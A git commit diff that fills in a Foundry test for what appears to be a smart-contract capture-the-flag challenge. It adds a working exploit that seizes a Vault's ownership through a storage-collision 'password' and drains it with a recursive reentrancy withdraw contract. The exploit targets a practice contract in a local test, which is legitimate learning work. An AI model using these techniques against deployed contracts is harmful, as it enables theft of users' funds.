352854991c9a3d79da78b8f99ba452c36df5b9b3
Jack <you@example.com>
2025-05-23 04:11:21 +0000

    attack src

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -4,9 +4,6 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
 
-
-
-
 contract VaultExploiter is Test {
     Vault public vault;
     VaultLogic public logic;
@@ -23,17 +20,62 @@ contract VaultExploiter is Test {
 
         vault.deposite{value: 0.1 ether}();
         vm.stopPrank();
-
     }
 
     function testExploit() public {
         vm.deal(palyer, 1 ether);
         vm.startPrank(palyer);
 
-        // add your hacker code.
+        bytes32 password = bytes32(uint256(uint160(address(logic))));
+
+        // 构造调用数据
+        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", password, palyer);
+        (bool success,) = address(vault).call(data);
+        require(success, "changeOwner failed");
+
+        vault.openWithdraw();
+
+        ReentrancyAttack attack = new ReentrancyAttack(address(vault));
+
+        uint256 vaultBalance = address(vault).balance/100;
+        attack.deposite{value: vaultBalance}();
+        attack.attack();
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
     }
+}
 
+contract ReentrancyAttack {
+    Vault public vault;
+    address public owner;
+    uint256 public attackCount;
+
+    constructor(address _vault) {
+        vault = Vault(payable(_vault));
+        owner = msg.sender;
+    }
+
+    function deposite() external payable {
+        vault.deposite{value: msg.value}();
+    }
+
+    // 攻击入口：存款 + 触发提款
+    function attack() external payable {
+        vault.withdraw(); // 首次提款，触发重入
+    }
+
+    // 接收 ETH 时递归调用 withdraw()
+    receive() external payable {
+        //console.log("vault balance:", address(vault).balance); && attackCount < 10
+        if (address(vault).balance > 0 ether) {
+            attackCount++;
+            vault.withdraw(); // 重入攻击
+        }
+    }
+
+    // 提取盗取的 ETH
+    function collect() external {
+        payable(owner).transfer(address(this).balance);
+    }
 }
